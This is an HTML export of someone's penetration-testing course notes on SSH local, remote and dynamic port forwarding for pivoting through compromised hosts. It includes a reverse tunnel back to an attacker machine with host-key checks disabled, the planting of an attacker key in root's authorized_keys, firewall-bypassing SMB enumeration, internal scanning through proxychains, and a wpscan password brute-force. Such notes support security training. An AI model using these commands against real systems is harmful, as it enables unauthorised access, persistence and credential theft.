<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>02- SSH forwarding</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>02- SSH forwarding</h1><br/><p><strong><h2>SSH Local port forwarding</h2></strong><ul><li>goal<ul><li>bypass firewall rules  because tunnedled in ssh session</li><li>access only internally exposed services from host </li></ul></li><li>ssh -N -L [bind_addr:]port:host:hostport &lt;user&gt;@&lt;addr&gt;<ul><li>// host is the host relative to the remote ssh </li><li>e.g if we want to access to services in local ssh </li><li>sudo ssh -N -L 4444:localhost:80 -p2222 student@$target</li><li></li></ul></li></ul><img src="images/162-1.png" alt="images/162-1.png" /><ul><li>protocol is tunnemled through SSH =&gt; only port  22 shoiuld be enabled </li><li>Local port forwarding =&gt; local machine can access remote address as it was in local</li><li>we can do it for all ports</li><li>e.g : smb (enumerate smb share of windows servers that bloacks the port) <ul><li>kali@ sudo ssh -N -L 0.0.0.0:445:$remote:445</li><li>smb.conf :<ul><li>min protocol = SMB2</li><li></li></ul></li><li>sudo /etc/init.d/smbd restart</li><li></li><li>smbclient -L 127.0.0.1 -U Administrator // enumerate smb shares on windows target  </li></ul></li></ul></p><p></p><p></p><p><strong><h2>SSH Remote Port forwarding</h2></strong><ul><li>kali =&gt;debian =&gt; windows</li><li>from debian we want to expose service of kali in windows machine</li><li>goal expose local services to compromised machine (debian)<ul><li></li></ul></li></ul><img src="images/162-2.png" alt="images/162-2.png" /><ul><li>remote server have access to local port services </li><li></li></ul><img src="images/162-3.png" alt="images/162-3.png" /></p><p><ul><li>ssh -N -R $target:21:127.0.0.1:1121 sean@$target</li></ul></p><p><strong><h2>Stable pivot point using remote port forwarding</h2></strong><ul><li>goal: create a stable pivot hen we don&#39;t have ttyn and no user (www-data)<ul><li>Commands kali<ul><li></li></ul></li></ul></li></ul><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">mkdir</span> keys<br /><span style="color:#ff9d00;font-weight:700">cd</span> keys<br /><span style="color:#ff9d00;font-weight:700">ssh-keygen</span><br />        <span style="color:#ff9d00;font-weight:700">&gt;&gt;</span> <span style="color:#ff9d00;font-weight:700">/</span>tmp<span style="color:#ff9d00;font-weight:700">/</span>keys<span style="color:#ff9d00;font-weight:700">/</span>id_rsa<br /><span style="color:#ff9d00;font-weight:700">cat</span> id_rsa.pub</pre></div><ul><li>Commands pivot <ul><li></li></ul></li></ul><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">ssh</span> -f -N -R 1122:10.5.5.11:22 -R 13306:10.5.5.11:3306 -o <span style="color:#3ad900;font-weight:400">&quot;UserKnownHostsFile=/dev/null&quot;</span> -o <span style="color:#3ad900;font-weight:400">&quot;StrictHostKeyChecking=no&quot;</span> -i /tmp/keys/id_rsa kali@10.11.0.4</pre></div><ul><li>if we have user<ul><li></li></ul></li></ul><div class="codebox"><pre><span style="color:#0088ff;font-weight:400">#kali</span><br /><span style="color:#ff9d00;font-weight:700">ssh-keygen</span> <br />cat:~<span style="color:#ff9d00;font-weight:700">/</span>.ssh<span style="color:#ff9d00;font-weight:700">/</span>id_rsa.pub<br /><br /><span style="color:#0088ff;font-weight:400">##target</span><br /><span style="color:#ff9d00;font-weight:700">mkdir</span> /root/.ssh<br /><span style="color:#ff9d00;font-weight:700">echo</span> <span style="color:#3ad900;font-weight:400">&quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQD... kali@kali&quot;</span> <span style="color:#ff9d00;font-weight:700">&gt;</span> /root/.ssh/authorized_keys<br /><span style="color:#0088ff;font-weight:400">## connect</span><br /><span style="color:#ff9d00;font-weight:700">ssh</span> root@sandbox.local</pre></div></p><p><strong><h2>SSH dynamic port forwarding</h2></strong><ul><li>bind to a port and tunnel traffic to it </li><li>ssh -N -D &lt;address to bind to&gt;:&lt;port to bind to&gt; username@remoteaddr</li><li> </li></ul><img src="images/162-4.png" alt="images/162-4.png" /><ul><li>Context<ul><li></li></ul></li></ul><img src="images/162-5.png" alt="images/162-5.png" /><ul><li>we want to reach secondary internal network within windows server without setting 2 tunnels </li></ul></li><li><img src="images/162-6.png" alt="images/162-6.png" /><ul><li>create sock4 proxy which will tunnel all incoming traffic to any host on the target network through our compromised linux machine </li></ul></li><li>nano /etc/proxychains.conf<ul><li>socks4 127.0.0.1 8080</li></ul></li><li>proxychains nmap -sT &lt;internal network&gt;<ul><li></li></ul><img src="images/162-7.png" alt="images/162-7.png" /></p><p></p><p></p><p></p><p>Note:<ul><li>$target is related to the proxy server </li><li>if we want to expose services running on the local machine<ul><li>proxychains nmap $target </li></ul></li></ul></p><p></p><p></p><p></p><p><em><h2>O exercises notes</h2></em></p><p><ul><li>ssh -N -o &quot;UserKnownHostsFile=/dev/null&quot; -o &quot;StrictHostKeyChecking=no&quot; -L 9001:localhost:80 student@$target -p2222</li></ul></p><p></p><p></p><p></p><p>ssh -o &quot;UserKnownHostsFile=/dev/null&quot; -o &quot;StrictHostKeyChecking=no&quot;  student@$target -p2222</p><p></p><p></p><p>ssh -N -o &quot;UserKnownHostsFile=/dev/null&quot; -o &quot;StrictHostKeyChecking=no&quot; -D 127.0.0.1:1080 student@$target -p2222</p><p></p><p></p><p>proxychains nmap -sT -Pn $localhost -p80</p><p></p><p></p><p></p><p></p><p> proxychains -q wpscan -U offsec -P /usr/share/rockyou.txt --url http://localhost/wp-login.php</p><p></p><p></p><p><ul><li>for firefox foxyproxy and clear cache data </li></ul></p></div>
</body>
</html>
